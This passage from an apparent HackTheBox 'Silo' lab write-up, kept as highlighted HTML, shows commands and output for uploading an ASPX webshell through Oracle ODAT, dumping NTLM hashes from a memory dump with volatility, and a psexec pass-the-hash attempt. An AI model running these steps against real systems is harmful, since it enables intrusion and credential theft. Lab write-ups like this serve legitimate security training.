+ <span class="n">Volume</span> <span class="nb">Serial</span> <span class="nb">Number</span> <span class="k">is</span> <span class="mi">78</span><span class="n">D4</span><span class="o">-</span><span class="n">EA4D</span>
+
+ <span class="n">Directory</span> <span class="k">of</span> <span class="k">c</span><span class="p">:</span><span class="err">\</span><span class="n">Users</span><span class="err">\</span><span class="n">Phineas</span><span class="err">\</span><span class="n">Desktop</span>
+
+<span class="mi">01</span><span class="o">/</span><span class="mi">07</span><span class="o">/</span><span class="mi">2018</span>  <span class="mi">03</span><span class="p">:</span><span class="mi">03</span> <span class="n">PM</span>    <span class="o">&lt;</span><span class="n">DIR</span><span class="o">&gt;</span>          <span class="p">.</span>
+<span class="mi">01</span><span class="o">/</span><span class="mi">07</span><span class="o">/</span><span class="mi">2018</span>  <span class="mi">03</span><span class="p">:</span><span class="mi">03</span> <span class="n">PM</span>    <span class="o">&lt;</span><span class="n">DIR</span><span class="o">&gt;</span>          <span class="p">..</span>
+<span class="mi">01</span><span class="o">/</span><span class="mi">05</span><span class="o">/</span><span class="mi">2018</span>  <span class="mi">11</span><span class="p">:</span><span class="mi">56</span> <span class="n">PM</span>               <span class="mi">300</span> <span class="n">Oracle</span> <span class="n">issue</span><span class="p">.</span><span class="n">txt</span>
+<span class="mi">01</span><span class="o">/</span><span class="mi">04</span><span class="o">/</span><span class="mi">2018</span>  <span class="mi">10</span><span class="p">:</span><span class="mi">41</span> <span class="n">PM</span>                <span class="mi">32</span> <span class="k">user</span><span class="p">.</span><span class="n">txt</span>
+               <span class="mi">2</span> <span class="n">File</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>            <span class="mi">332</span> <span class="n">bytes</span>
+               <span class="mi">2</span> <span class="n">Dir</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>  <span class="mi">15</span><span class="p">,</span><span class="mi">184</span><span class="p">,</span><span class="mi">654</span><span class="p">,</span><span class="mi">336</span> <span class="n">bytes</span> <span class="k">free</span>
+
+<span class="k">c</span><span class="p">:</span><span class="err">\</span><span class="n">Users</span><span class="err">\</span><span class="n">Phineas</span><span class="err">\</span><span class="n">Desktop</span><span class="o">&gt;</span><span class="k">type</span> <span class="k">user</span><span class="p">.</span><span class="n">txt</span>
+<span class="k">type</span> <span class="k">user</span><span class="p">.</span><span class="n">txt</span>
+<span class="mi">92</span><span class="o">****************************</span><span class="mi">17</span>
+<span class="k">c</span><span class="p">:</span><span class="err">\</span><span class="n">Users</span><span class="err">\</span><span class="n">Phineas</span><span class="err">\</span><span class="n">Desktop</span><span class="o">&gt;</span>
+</pre></div>
+
+
+<p>together with the <code>user.txt</code> file we can see another text file in the Desktop so I decided to have a look:</p>
+<div class="highlight"><pre><span></span><span class="k">c</span><span class="p">:</span><span class="err">\</span><span class="n">Users</span><span class="err">\</span><span class="n">Phineas</span><span class="err">\</span><span class="n">Desktop</span><span class="o">&gt;</span><span class="k">type</span> <span class="ss">&quot;Oracle issue.txt&quot;</span>
+<span class="k">type</span> <span class="ss">&quot;Oracle issue.txt&quot;</span>
+<span class="n">Support</span> <span class="n">vendor</span> <span class="n">engaged</span> <span class="k">to</span> <span class="n">troubleshoot</span> <span class="n">Windows</span> <span class="o">/</span> <span class="n">Oracle</span> <span class="n">performance</span> <span class="n">issue</span> <span class="p">(</span><span class="k">full</span> <span class="n">memory</span> <span class="n">dump</span> <span class="n">requested</span><span class="p">):</span>
+
+<span class="n">Dropbox</span> <span class="n">link</span> <span class="n">provided</span> <span class="k">to</span> <span class="n">vendor</span> <span class="p">(</span><span class="k">and</span> <span class="n">password</span> <span class="k">under</span> <span class="n">separate</span> <span class="n">cover</span><span class="p">).</span>
+
+<span class="n">Dropbox</span> <span class="n">link</span> 
+<span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="p">.</span><span class="n">dropbox</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">sh</span><span class="o">/</span><span class="mi">69</span><span class="n">skryzfszb7elq</span><span class="o">/</span><span class="n">AADZnQEbbqDoIf5L2d0PBxENa</span><span class="o">?</span><span class="n">dl</span><span class="o">=</span><span class="mi">0</span>
+
+<span class="n">link</span> <span class="n">password</span><span class="p">:</span>
+<span class="o">%</span><span class="n">Hm8646uC$</span>
+</pre></div>
+
+
+<p>So we have a dropbox link and a password but if I try to download that file it fails stating that the password is incorrect. </p>
+<p><img alt="" src="../images/silo-dropbox.png"></p>
+<p>So I started thinking it was just a trick to make me waste time. However, I remembered that some unicode characters may behave funny over shells so I decided to double check by downloading the file on my box.</p>
+<div class="highlight"><pre><span></span><span class="err">┌─</span><span class="o">[</span><span class="n">✗</span><span class="o">]</span><span class="err">─</span><span class="o">[</span><span class="n">doluar@parrot</span><span class="o">]</span><span class="err">─</span><span class="o">[</span><span class="n">~/Tools/odat</span><span class="o">]</span><span class="w"></span>
+<span class="err">└──╼</span><span class="w"> </span><span class="err">$</span><span class="n">python3</span><span class="w"> </span><span class="n">odat</span><span class="p">.</span><span class="n">py</span><span class="w"> </span><span class="n">dbmsxslprocessor</span><span class="w"> </span><span class="o">-</span><span class="n">s</span><span class="w"> </span><span class="mf">10.10.10.82</span><span class="w"> </span><span class="o">-</span><span class="n">U</span><span class="w"> </span><span class="n">doluar</span><span class="w"> </span><span class="o">-</span><span class="n">P</span><span class="w"> </span><span class="n">myp4ssw0rd</span><span class="w">  </span><span class="o">-</span><span class="n">d</span><span class="w"> </span><span class="n">XE</span><span class="w"> </span><span class="c1">--sysdba --getFile &quot;c:\Users\Phineas\Desktop&quot; &quot;Oracle issue.txt&quot; &quot;/home/doluar/Documents/htb/boxes/silo/OracleIssue.txt&quot;</span>
+
+<span class="o">[</span><span class="n">1</span><span class="o">]</span><span class="w"> </span><span class="p">(</span><span class="mf">10.10.10.82</span><span class="err">:</span><span class="mi">1521</span><span class="p">)</span><span class="err">:</span><span class="w"> </span><span class="k">Get</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">doluar</span><span class="o">/</span><span class="n">Documents</span><span class="o">/</span><span class="n">htb</span><span class="o">/</span><span class="n">boxes</span><span class="o">/</span><span class="n">silo</span><span class="o">/</span><span class="n">OracleIssue</span><span class="p">.</span><span class="n">txt</span><span class="w"> </span><span class="n">remote</span><span class="w"> </span><span class="k">file</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="nl">c</span><span class="p">:</span><span class="err">\</span><span class="n">Users</span><span class="err">\</span><span class="n">Phineas</span><span class="err">\</span><span class="n">Desktop</span><span class="w"> </span><span class="k">path</span><span class="w"> </span><span class="p">(</span><span class="n">named</span><span class="w"> </span><span class="n">Oracle</span><span class="w"> </span><span class="n">issue</span><span class="p">.</span><span class="n">txt</span><span class="p">)</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="mf">10.10.10.82</span><span class="w"> </span><span class="n">server</span><span class="w"></span>
+<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="n">The</span><span class="w"> </span><span class="n">Oracle</span><span class="w"> </span><span class="n">issue</span><span class="p">.</span><span class="n">txt</span><span class="w"> </span><span class="n">remote</span><span class="w"> </span><span class="k">file</span><span class="w"> </span><span class="n">was</span><span class="w"> </span><span class="n">downloaded</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">doluar</span><span class="o">/</span><span class="n">Documents</span><span class="o">/</span><span class="n">htb</span><span class="o">/</span><span class="n">boxes</span><span class="o">/</span><span class="n">silo</span><span class="o">/</span><span class="n">OracleIssue</span><span class="p">.</span><span class="n">txt</span><span class="w"></span>
+<span class="err">┌─</span><span class="o">[</span><span class="n">doluar@parrot</span><span class="o">]</span><span class="err">─</span><span class="o">[</span><span class="n">~/Tools/odat</span><span class="o">]</span><span class="w"></span>
+<span class="err">└──╼</span><span class="w"> </span><span class="err">$</span><span class="n">cat</span><span class="w"> </span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">doluar</span><span class="o">/</span><span class="n">Documents</span><span class="o">/</span><span class="n">htb</span><span class="o">/</span><span class="n">boxes</span><span class="o">/</span><span class="n">silo</span><span class="o">/</span><span class="n">OracleIssue</span><span class="p">.</span><span class="n">txt</span><span class="w"></span>
+<span class="n">Support</span><span class="w"> </span><span class="n">vendor</span><span class="w"> </span><span class="n">engaged</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">troubleshoot</span><span class="w"> </span><span class="n">Windows</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="n">Oracle</span><span class="w"> </span><span class="n">performance</span><span class="w"> </span><span class="n">issue</span><span class="w"> </span><span class="p">(</span><span class="k">full</span><span class="w"> </span><span class="n">memory</span><span class="w"> </span><span class="k">dump</span><span class="w"> </span><span class="n">requested</span><span class="p">)</span><span class="err">:</span><span class="w"></span>
+
+<span class="n">Dropbox</span><span class="w"> </span><span class="n">link</span><span class="w"> </span><span class="n">provided</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">vendor</span><span class="w"> </span><span class="p">(</span><span class="ow">and</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="k">under</span><span class="w"> </span><span class="n">separate</span><span class="w"> </span><span class="n">cover</span><span class="p">).</span><span class="w"></span>
+
+<span class="n">Dropbox</span><span class="w"> </span><span class="n">link</span><span class="w"> </span>
+<span class="nl">https</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="p">.</span><span class="n">dropbox</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">sh</span><span class="o">/</span><span class="mi">69</span><span class="n">skryzfszb7elq</span><span class="o">/</span><span class="n">AADZnQEbbqDoIf5L2d0PBxENa</span><span class="vm">?</span><span class="n">dl</span><span class="o">=</span><span class="mi">0</span><span class="w"></span>
+
+<span class="n">link</span><span class="w"> </span><span class="nl">password</span><span class="p">:</span><span class="w"></span>
+<span class="err">�</span><span class="o">%</span><span class="n">Hm8646uC</span><span class="err">$</span><span class="w"></span>
+</pre></div>
+
+
+<p>once downloaded the file I get the another character at the beginning, I try again but same result, password incorrect.</p>
+<p>Searching on google I found this on wikipedia:</p>
+<p>"The replacement character (often a black diamond with a white question mark or an empty square box) is a symbol found in the Unicode standard at code point U+FFFD in the Specials table. It is used to indicate problems when a system is unable to render a stream of data to a correct symbol." So this confirms the thesis that there is a rendering problem with this specific character and I don't know how to fix this issue. I even dowloaded the file on another box and tried with several different text editors like notepad++, MS Word, Sublime text, but I was unable to get that character rendered properly. After doing some research I found someone online was able to get the real characher through a webshell. So I downloaded an aspx webshell, available here https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/asp/cmdasp.aspx, and I uploaded it to the victim box using the same technique as before:</p>
+<div class="highlight"><pre><span></span><span class="err">┌─</span><span class="o">[</span><span class="n">doluar@parrot</span><span class="o">]</span><span class="err">─</span><span class="o">[</span><span class="n">~/Tools/odat</span><span class="o">]</span><span class="w"></span>
+<span class="err">└──╼</span><span class="w"> </span><span class="err">$</span><span class="n">python3</span><span class="w"> </span><span class="n">odat</span><span class="p">.</span><span class="n">py</span><span class="w"> </span><span class="n">dbmsxslprocessor</span><span class="w"> </span><span class="o">-</span><span class="n">s</span><span class="w"> </span><span class="mf">10.10.10.82</span><span class="w"> </span><span class="o">-</span><span class="n">U</span><span class="w"> </span><span class="n">doluar</span><span class="w"> </span><span class="o">-</span><span class="n">P</span><span class="w"> </span><span class="n">myp4ssw0rd</span><span class="w">  </span><span class="o">-</span><span class="n">d</span><span class="w"> </span><span class="n">XE</span><span class="w"> </span><span class="c1">--sysdba --putFile &quot;C:\inetpub\wwwroot&quot; &quot;webshell.aspx&quot; &quot;/home/doluar/Documents/htb/boxes/silo/webshell.aspx&quot;</span>
+
+<span class="o">[</span><span class="n">1</span><span class="o">]</span><span class="w"> </span><span class="p">(</span><span class="mf">10.10.10.82</span><span class="err">:</span><span class="mi">1521</span><span class="p">)</span><span class="err">:</span><span class="w"> </span><span class="n">Put</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">doluar</span><span class="o">/</span><span class="n">Documents</span><span class="o">/</span><span class="n">htb</span><span class="o">/</span><span class="n">boxes</span><span class="o">/</span><span class="n">silo</span><span class="o">/</span><span class="n">webshell</span><span class="p">.</span><span class="n">aspx</span><span class="w"> </span><span class="k">local</span><span class="w"> </span><span class="k">file</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="nl">C</span><span class="p">:</span><span class="err">\</span><span class="n">inetpub</span><span class="err">\</span><span class="n">wwwroot</span><span class="w"> </span><span class="k">path</span><span class="w"> </span><span class="p">(</span><span class="n">named</span><span class="w"> </span><span class="n">webshell</span><span class="p">.</span><span class="n">aspx</span><span class="p">)</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="mf">10.10.10.82</span><span class="w"> </span><span class="n">server</span><span class="w"></span>
+<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="n">The</span><span class="w"> </span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">doluar</span><span class="o">/</span><span class="n">Documents</span><span class="o">/</span><span class="n">htb</span><span class="o">/</span><span class="n">boxes</span><span class="o">/</span><span class="n">silo</span><span class="o">/</span><span class="n">webshell</span><span class="p">.</span><span class="n">aspx</span><span class="w"> </span><span class="k">local</span><span class="w"> </span><span class="k">file</span><span class="w"> </span><span class="n">was</span><span class="w"> </span><span class="n">put</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">remote</span><span class="w"> </span><span class="nl">C</span><span class="p">:</span><span class="err">\</span><span class="n">inetpub</span><span class="err">\</span><span class="n">wwwroot</span><span class="w"> </span><span class="k">path</span><span class="w"> </span><span class="p">(</span><span class="n">named</span><span class="w"> </span><span class="n">webshell</span><span class="p">.</span><span class="n">aspx</span><span class="p">)</span><span class="w"></span>
+</pre></div>
+
+
+<p>Then I browse the webpage:</p>
+<p><img alt="" src="../images/silo-webshell.png"></p>
+<p>Now we can see a <code>£</code> as the first character of the password: <code>£%Hm8646uC$</code>.</p>
+<p>Now I was able to login successfully and dowload the file which seems to be a memory dump:</p>
+<p><img alt="" src="../images/silo-mdump.png"></p>
+<p>Then I unzip the file and I scan the dump with <code>volatility</code>:</p>
+<div class="highlight"><pre><span></span><span class="err">┌─</span><span class="o">[</span><span class="n">doluar@parrot</span><span class="o">]</span><span class="err">─</span><span class="o">[</span><span class="n">~</span><span class="o">]</span><span class="w">                                                                                                 </span>
+<span class="err">└──╼</span><span class="w"> </span><span class="err">$</span><span class="n">volatility</span><span class="w"> </span><span class="n">kdbgscan</span><span class="w"> </span><span class="o">-</span><span class="n">f</span><span class="w"> </span><span class="o">~/</span><span class="n">Documents</span><span class="o">/</span><span class="n">htb</span><span class="o">/</span><span class="n">boxes</span><span class="o">/</span><span class="n">silo</span><span class="o">/</span><span class="n">SILO</span><span class="o">-</span><span class="mi">20180105</span><span class="o">-</span><span class="mf">221806.</span><span class="n">dmp</span><span class="w"></span>
+<span class="o">&lt;</span><span class="n">SNIP</span><span class="w">     </span><span class="o">&gt;&lt;</span><span class="n">SNIP</span><span class="o">&gt;</span><span class="w"></span>
+
+<span class="o">**************************************************</span><span class="w"></span>
+<span class="o">**************************************************</span><span class="w">                                                                    </span>
+<span class="n">Instantiating</span><span class="w"> </span><span class="n">KDBG</span><span class="w"> </span><span class="k">using</span><span class="err">:</span><span class="w"> </span><span class="n">Unnamed</span><span class="w"> </span><span class="k">AS</span><span class="w"> </span><span class="n">Win2012R2x64_18340</span><span class="w"> </span><span class="p">(</span><span class="mf">6.3.9601</span><span class="w"> </span><span class="mi">64</span><span class="nc">bit</span><span class="p">)</span><span class="w">                                              </span>
+<span class="n">Offset</span><span class="w"> </span><span class="p">(</span><span class="n">V</span><span class="p">)</span><span class="w">                    </span><span class="err">:</span><span class="w"> </span><span class="mh">0xf80078520a30</span><span class="w">                                                                        </span>
+<span class="n">Offset</span><span class="w"> </span><span class="p">(</span><span class="n">P</span><span class="p">)</span><span class="w">                    </span><span class="err">:</span><span class="w"> </span><span class="mh">0x2320a30</span><span class="w">                                                                             </span>
+<span class="n">KdCopyDataBlock</span><span class="w"> </span><span class="p">(</span><span class="n">V</span><span class="p">)</span><span class="w">           </span><span class="err">:</span><span class="w"> </span><span class="mh">0xf8007845f9b0</span><span class="w">                                                                        </span>
+<span class="n">Block</span><span class="w"> </span><span class="n">encoded</span><span class="w">                 </span><span class="err">:</span><span class="w"> </span><span class="n">Yes</span><span class="w">                       </span>
+<span class="n">Wait</span><span class="w"> </span><span class="n">never</span><span class="w">                    </span><span class="err">:</span><span class="w"> </span><span class="mh">0xd08e8400bd4a143a</span><span class="w">        </span>
+<span class="n">Wait</span><span class="w"> </span><span class="n">always</span><span class="w">                   </span><span class="err">:</span><span class="w"> </span><span class="mh">0x17a949efd11db80</span><span class="w">                                                                                                                                                                                           </span>
+<span class="n">KDBG</span><span class="w"> </span><span class="n">owner</span><span class="w"> </span><span class="n">tag</span><span class="w"> </span><span class="k">check</span><span class="w">          </span><span class="err">:</span><span class="w"> </span><span class="k">True</span><span class="w">                       </span>
+<span class="n">Profile</span><span class="w"> </span><span class="n">suggestion</span><span class="w"> </span><span class="p">(</span><span class="n">KDBGHeader</span><span class="p">)</span><span class="err">:</span><span class="w"> </span><span class="n">Win2012R2x64_18340</span><span class="w">                                                                                                                                                                                         </span>
+<span class="n">Version64</span><span class="w">                     </span><span class="err">:</span><span class="w"> </span><span class="mh">0xf80078520d90</span><span class="w"> </span><span class="p">(</span><span class="nl">Major</span><span class="p">:</span><span class="w"> </span><span class="mi">15</span><span class="p">,</span><span class="w"> </span><span class="nl">Minor</span><span class="p">:</span><span class="w"> </span><span class="mi">9600</span><span class="p">)</span><span class="w">                                               </span>
+<span class="n">Service</span><span class="w"> </span><span class="n">Pack</span><span class="w"> </span><span class="p">(</span><span class="n">CmNtCSDVersion</span><span class="p">)</span><span class="w"> </span><span class="err">:</span><span class="w"> </span><span class="mi">0</span><span class="w">                                                                                                                                                                                                           </span>
+<span class="n">Build</span><span class="w"> </span><span class="n">string</span><span class="w"> </span><span class="p">(</span><span class="n">NtBuildLab</span><span class="p">)</span><span class="w">     </span><span class="err">:</span><span class="w"> </span><span class="mf">9600.16384</span><span class="p">.</span><span class="n">amd64fre</span><span class="p">.</span><span class="n">winblue_rtm</span><span class="p">.</span><span class="w">                                                      </span>
+<span class="n">PsActiveProcessHead</span><span class="w">           </span><span class="err">:</span><span class="w"> </span><span class="mh">0xfffff80078537700</span><span class="w"> </span><span class="p">(</span><span class="mi">51</span><span class="w"> </span><span class="n">processes</span><span class="p">)</span><span class="w">                                                                                                                                                                           </span>
+<span class="n">PsLoadedModuleList</span><span class="w">            </span><span class="err">:</span><span class="w"> </span><span class="mh">0xfffff800785519b0</span><span class="w"> </span><span class="p">(</span><span class="mi">148</span><span class="w"> </span><span class="n">modules</span><span class="p">)</span><span class="w">                                                      </span>
+<span class="n">KernelBase</span><span class="w">                    </span><span class="err">:</span><span class="w"> </span><span class="mh">0xfffff8007828a000</span><span class="w"> </span><span class="p">(</span><span class="n">Matches</span><span class="w"> </span><span class="nl">MZ</span><span class="p">:</span><span class="w"> </span><span class="k">True</span><span class="p">)</span><span class="w">                                                                                                                                                                       </span>
+<span class="n">Major</span><span class="w"> </span><span class="p">(</span><span class="n">OptionalHeader</span><span class="p">)</span><span class="w">        </span><span class="err">:</span><span class="w"> </span><span class="mi">6</span><span class="w">                                                                                     </span>
+<span class="n">Minor</span><span class="w"> </span><span class="p">(</span><span class="n">OptionalHeader</span><span class="p">)</span><span class="w">        </span><span class="err">:</span><span class="w"> </span><span class="mi">3</span><span class="w">                         </span>
+<span class="n">KPCR</span><span class="w">                          </span><span class="err">:</span><span class="w"> </span><span class="mh">0xfffff8007857b000</span><span class="w"> </span><span class="p">(</span><span class="n">CPU</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"></span>
+<span class="n">KPCR</span><span class="w">                          </span><span class="err">:</span><span class="w"> </span><span class="mh">0xffffd000207e8000</span><span class="w"> </span><span class="p">(</span><span class="n">CPU</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w">  </span>
+<span class="o">&lt;</span><span class="n">SNIP</span><span class="w">     </span><span class="o">&gt;&lt;</span><span class="n">SNIP</span><span class="o">&gt;</span><span class="w"></span>
+</pre></div>
+
+
+<p>Since the output is very long I only pasted here a snippet. The bit I pasted is repeated several times but with different profiles. I only pasted the one that is relevant to the victim OS version I had found before:</p>
+<div class="highlight"><pre><span></span><span class="err">meterpreter &gt; sysinfo</span>
+<span class="err">Computer        : SILO</span>
+<span class="err">OS              : Windows 2012 R2 (6.3 Build 9600).</span>
+<span class="err">Architecture    : x64</span>
+<span class="err">System Language : en_GB</span>
+<span class="err">Domain          : HTB</span>
+<span class="err">Logged On Users : 0</span>
+<span class="err">Meterpreter     : x64/windows</span>
+</pre></div>
+
+
+<p>So now I run volatility again using the Win 2012 profile:</p>
+<div class="highlight"><pre><span></span><span class="err">┌─</span><span class="p">[</span><span class="n">doluar</span><span class="p">@</span><span class="n">parrot</span><span class="p">]</span><span class="err">─</span><span class="p">[</span><span class="o">~</span><span class="p">]</span>
+<span class="err">└──╼</span> <span class="err">$</span><span class="n">volatility</span> <span class="o">-</span><span class="n">f</span> <span class="o">~/</span><span class="n">Documents</span><span class="o">/</span><span class="n">htb</span><span class="o">/</span><span class="n">boxes</span><span class="o">/</span><span class="n">silo</span><span class="o">/</span><span class="n">SILO</span><span class="o">-</span><span class="mi">20180105</span><span class="o">-</span><span class="mf">221806.</span><span class="n">dmp</span> <span class="o">--</span><span class="n">profile</span> <span class="n">Win2012R2x64</span> <span class="n">hivelist</span>
+<span class="n">Volatility</span> <span class="n">Foundation</span> <span class="n">Volatility</span> <span class="n">Framework</span> <span class="mf">2.6</span>
+<span class="n">Virtual</span>            <span class="n">Physical</span>           <span class="n">Name</span>
+<span class="o">------------------</span> <span class="o">------------------</span> <span class="o">----</span>
+<span class="mh">0xffffc0000100a000</span> <span class="mh">0x000000000d40e000</span> <span class="err">\</span><span class="o">??</span><span class="err">\</span><span class="nl">C</span><span class="p">:</span><span class="err">\</span><span class="n">Users</span><span class="err">\</span><span class="n">Administrator</span><span class="err">\</span><span class="n">AppData</span><span class="err">\</span><span class="n">Local</span><span class="err">\</span><span class="n">Microsoft</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">UsrClass</span><span class="p">.</span><span class="n">dat</span>
+<span class="mh">0xffffc000011fb000</span> <span class="mh">0x0000000034570000</span> <span class="err">\</span><span class="n">SystemRoot</span><span class="err">\</span><span class="n">System32</span><span class="err">\</span><span class="n">config</span><span class="err">\</span><span class="n">DRIVERS</span>
+<span class="mh">0xffffc00001600000</span> <span class="mh">0x000000003327b000</span> <span class="err">\</span><span class="o">??</span><span class="err">\</span><span class="nl">C</span><span class="p">:</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">AppCompat</span><span class="err">\</span><span class="n">Programs</span><span class="err">\</span><span class="n">Amcache</span><span class="p">.</span><span class="n">hve</span>
+<span class="mh">0xffffc0000001e000</span> <span class="mh">0x0000000000b65000</span> <span class="p">[</span><span class="n">no</span> <span class="n">name</span><span class="p">]</span>
+<span class="mh">0xffffc00000028000</span> <span class="mh">0x0000000000a70000</span> <span class="err">\</span><span class="n">REGISTRY</span><span class="err">\</span><span class="n">MACHINE</span><span class="err">\</span><span class="n">SYSTEM</span>
+<span class="mh">0xffffc00000052000</span> <span class="mh">0x000000001a25b000</span> <span class="err">\</span><span class="n">REGISTRY</span><span class="err">\</span><span class="n">MACHINE</span><span class="err">\</span><span class="n">HARDWARE</span>
+<span class="mh">0xffffc000004de000</span> <span class="mh">0x0000000024cf8000</span> <span class="err">\</span><span class="n">Device</span><span class="err">\</span><span class="n">HarddiskVolume1</span><span class="err">\</span><span class="n">Boot</span><span class="err">\</span><span class="n">BCD</span>
+<span class="mh">0xffffc00000103000</span> <span class="mh">0x000000003205d000</span> <span class="err">\</span><span class="n">SystemRoot</span><span class="err">\</span><span class="n">System32</span><span class="err">\</span><span class="n">Config</span><span class="err">\</span><span class="n">SOFTWARE</span>
+<span class="mh">0xffffc00002c43000</span> <span class="mh">0x0000000028ecb000</span> <span class="err">\</span><span class="n">SystemRoot</span><span class="err">\</span><span class="n">System32</span><span class="err">\</span><span class="n">Config</span><span class="err">\</span><span class="n">DEFAULT</span>
+<span class="mh">0xffffc000061a3000</span> <span class="mh">0x0000000027532000</span> <span class="err">\</span><span class="n">SystemRoot</span><span class="err">\</span><span class="n">System32</span><span class="err">\</span><span class="n">Config</span><span class="err">\</span><span class="n">SECURITY</span>
+<span class="mh">0xffffc00000619000</span> <span class="mh">0x0000000026cc5000</span> <span class="err">\</span><span class="n">SystemRoot</span><span class="err">\</span><span class="n">System32</span><span class="err">\</span><span class="n">Config</span><span class="err">\</span><span class="n">SAM</span>
+<span class="mh">0xffffc0000060d000</span> <span class="mh">0x0000000026c93000</span> <span class="err">\</span><span class="o">??</span><span class="err">\</span><span class="nl">C</span><span class="p">:</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">ServiceProfiles</span><span class="err">\</span><span class="n">NetworkService</span><span class="err">\</span><span class="n">NTUSER</span><span class="p">.</span><span class="n">DAT</span>
+<span class="mh">0xffffc000006cf000</span> <span class="mh">0x000000002688f000</span> <span class="err">\</span><span class="n">SystemRoot</span><span class="err">\</span><span class="n">System32</span><span class="err">\</span><span class="n">Config</span><span class="err">\</span><span class="n">BBI</span>
+<span class="mh">0xffffc000007e7000</span> <span class="mh">0x00000000259a8000</span> <span class="err">\</span><span class="o">??</span><span class="err">\</span><span class="nl">C</span><span class="p">:</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">ServiceProfiles</span><span class="err">\</span><span class="n">LocalService</span><span class="err">\</span><span class="n">NTUSER</span><span class="p">.</span><span class="n">DAT</span>
+<span class="mh">0xffffc00000fed000</span> <span class="mh">0x000000000d67f000</span> <span class="err">\</span><span class="o">??</span><span class="err">\</span><span class="nl">C</span><span class="p">:</span><span class="err">\</span><span class="n">Users</span><span class="err">\</span><span class="n">Administrator</span><span class="err">\</span><span class="n">ntuser</span><span class="p">.</span><span class="n">dat</span>
+</pre></div>
+
+
+<p><code>Volatility</code> has many useful <a href="https://github.com/volatilityfoundation/volatility/wiki/Command-Reference#hivelist">options</a>. In this scenario I used <code>hivelist</code> to get a list of the registry hives in the memory dump.</p>
+<p>Once we have the hives, we can try to retrieve the administrator password hash. For this we can use the <code>hashdump</code> fuction of <code>volatility</code>. The help menu of volatility hashdump shows this:</p>
+<div class="highlight"><pre><span></span><span class="err">  -y SYS_OFFSET, --sys-offset=SYS_OFFSET</span>
+<span class="err">                        SYSTEM hive offset (virtual)</span>
+<span class="err">  -s SAM_OFFSET, --sam-offset=SAM_OFFSET</span>
+<span class="err">                        SAM hive offset (virtual)</span>
+</pre></div>
+
+
+<p>So since we have the SYS and SAM offsets from the previous command we can now try to fetch the administrator hash:</p>
+<div class="highlight"><pre><span></span><span class="err">┌─[doluar@parrot]─[~]</span>
+<span class="err">└──╼ $volatility -f ~/Documents/htb/boxes/silo/SILO-20180105-221806.dmp --profile Win2012R2x64 hashdump -y 0xffffc00000028000 -s 0xffffc00000619000</span>
+<span class="err">Volatility Foundation Volatility Framework 2.6</span>
+<span class="c">Administrator:500:aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7:::</span>
+<span class="c">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span>
+<span class="c">Phineas:1002:aad3b435b51404eeaad3b435b51404ee:8eacdd67b77749e65d3b3d5c110b0969:::</span>
+</pre></div>
+
+
+<p>Now I can use a python script, <a href="https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/psexec.py">psexec.py</a> to perform a pass-the-hash attack.</p>
+<div class="highlight"><pre><span></span><span class="err">┌─</span><span class="p">[</span><span class="n">doluar</span><span class="p">@</span><span class="n">parrot</span><span class="p">]</span><span class="err">─</span><span class="p">[</span><span class="o">~/</span><span class="n">Tools</span><span class="o">/</span><span class="n">impacket</span><span class="o">/</span><span class="n">examples</span><span class="p">]</span>
+<span class="err">└──╼</span> <span class="err">$</span><span class="p">.</span><span class="o">/</span><span class="n">psexec</span><span class="p">.</span><span class="n">py</span> <span class="o">-</span><span class="n">hashes</span> <span class="nl">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mf">9e730375</span><span class="n">b7cbcebf74ae46481e07b0c7</span> <span class="o">-</span><span class="n">target</span><span class="o">-</span><span class="n">ip</span> <span class="mf">10.10.10.82</span> <span class="n">administrator</span><span class="mf">@10.10.10.82</span>
+<span class="n">Impacket</span> <span class="n">v0</span><span class="mf">.9.22</span><span class="p">.</span><span class="n">dev1</span><span class="o">+</span><span class="mf">20200327.103853.7e505892</span> <span class="o">-</span> <span class="n">Copyright</span> <span class="mi">2020</span> <span class="n">SecureAuth</span> <span class="n">Corporation</span>
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Requesting</span> <span class="n">shares</span> <span class="n">on</span> <span class="mf">10.10.10.82</span><span class="p">.....</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Found</span> <span class="n">writable</span> <span class="n">share</span> <span class="n">ADMIN</span><span class="err">$</span>
